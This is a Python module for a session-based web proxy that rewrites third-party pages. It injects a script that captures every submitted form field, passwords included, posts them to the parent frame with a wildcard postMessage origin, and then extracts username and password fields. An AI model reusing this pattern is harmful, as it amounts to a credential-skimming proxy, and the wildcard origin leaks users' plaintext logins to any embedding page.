from __future__ import annotations

from typing import Dict, List, Tuple
from urllib.parse import urljoin, urlparse, urlencode, parse_qs, unquote

from bs4 import BeautifulSoup

from app.validators import validate_allowed_domain

PROXY_PATH = "/browser/go"


def resolve_real_url(url: str) -> str:
    if PROXY_PATH in url and "url=" in url:
        parsed = urlparse(url)
        query = parse_qs(parsed.query)
        if query.get("url"):
            return unquote(query["url"][0])
    return url


def _proxy_link(target_url: str, session_id: str) -> str:
    query = urlencode({"url": target_url, "sid": session_id})
    return f"{PROXY_PATH}?{query}"


def _is_navigable(url: str) -> bool:
    parsed = urlparse(url)
    return parsed.scheme in {"http", "https"} and bool(parsed.hostname)


def _abs_url(page_url: str, ref: str) -> str:
    return urljoin(page_url, ref.strip())


def _fix_asset_urls(soup: BeautifulSoup, page_url: str) -> None:
    """Load JS/CSS/images from real site — not via localhost (fixes blank page)."""
    for tag in soup.find_all(["script", "img", "source", "video", "audio", "iframe"]):
        if tag.get("src"):
            ref = tag["src"].strip()
            if ref and not ref.lower().startswith(("data:", "javascript:", "#")):
                tag["src"] = _abs_url(page_url, ref)

    for tag in soup.find_all("link", href=True):
        href = tag["href"].strip()
        rel = tag.get("rel") or []
        rel_text = " ".join(rel).lower() if isinstance(rel, list) else str(rel).lower()
        if href and (
            "stylesheet" in rel_text
            or "icon" in rel_text
            or "preload" in rel_text
            or href.endswith((".css", ".woff2", ".woff", ".ttf"))
        ):
            tag["href"] = _abs_url(page_url, href)


def rewrite_html(html: str, page_url: str, session_id: str) -> str:
    soup = BeautifulSoup(html, "html.parser")
    page_url = resolve_real_url(page_url)

    head = soup.find("head")
    if not head:
        head = soup.new_tag("head")
        if soup.html:
            soup.html.insert(0, head)
        else:
            soup.insert(0, head)

    if not soup.find("meta", attrs={"name": "viewport"}):
        viewport = soup.new_tag(
            "meta",
            attrs={"name": "viewport", "content": "width=device-width, initial-scale=1.0"},
        )
        head.insert(0, viewport)

    # Relative /assets/... must resolve to the real website, not localhost.
    parsed = urlparse(page_url)
    base_href = f"{parsed.scheme}://{parsed.netloc}/"
    existing_base = soup.find("base")
    if existing_base:
        existing_base["href"] = base_href
    else:
        base_tag = soup.new_tag("base", href=base_href)
        head.insert(0, base_tag)

    _fix_asset_urls(soup, page_url)

    for tag in soup.find_all("a", href=True):
        href = tag["href"].strip()
        if href.startswith("#") or href.lower().startswith(("javascript:", "mailto:", "tel:")):
            continue
        absolute = _abs_url(page_url, href)
        if _is_navigable(absolute):
            try:
                validate_allowed_domain(absolute)
                tag["href"] = _proxy_link(absolute, session_id)
            except ValueError:
                tag["href"] = absolute

    for tag in soup.find_all("form"):
        action = tag.get("action") or page_url
        absolute = _abs_url(page_url, action)
        if _is_navigable(absolute):
            try:
                validate_allowed_domain(absolute)
                tag["action"] = _proxy_link(absolute, session_id)
            except ValueError:
                tag["action"] = absolute
        if not tag.get("method"):
            tag["method"] = "post"

    style = soup.new_tag("style")
    style.string = "html,body{overflow:auto!important;min-height:100vh;margin:0;}"
    head.append(style)

    recorder = soup.new_tag("script")
    recorder.string = """
    window.addEventListener('submit', function(e) {
      try {
        const form = e.target;
        if (!form || form.tagName !== 'FORM') return;
        const data = {};
        new FormData(form).forEach((v, k) => { data[k] = v; });
        window.parent.postMessage({
          type: 'browser-login-captured',
          action: form.action,
          method: (form.method || 'GET').toUpperCase(),
          fields: data,
          pageUrl: window.location.href
        }, '*');
      } catch (err) {}
    }, true);
    """
    if soup.body:
        soup.body.append(recorder)
    else:
        body = soup.new_tag("body")
        body.append(recorder)
        if soup.html:
            soup.html.append(body)

    return str(soup)


def extract_form_fields(form_data: Dict[str, str]) -> Tuple[str, str, Dict[str, str]]:
    password_field = ""
    username_field = ""

    for key in form_data:
        lowered = key.lower()
        if "pass" in lowered or "pwd" in lowered or lowered == "password":
            password_field = key

    for key in form_data:
        if key == password_field:
            continue
        lowered = key.lower()
        if any(x in lowered for x in ("user", "email", "login", "account")):
            username_field = key

    if not password_field:
        raise ValueError("Form không có trường password")

    if not username_field:
        for key in form_data:
            if key != password_field and not key.startswith("_"):
                username_field = key
                break

    if not username_field:
        raise ValueError("Không xác định được trường username")

    return username_field, password_field, form_data
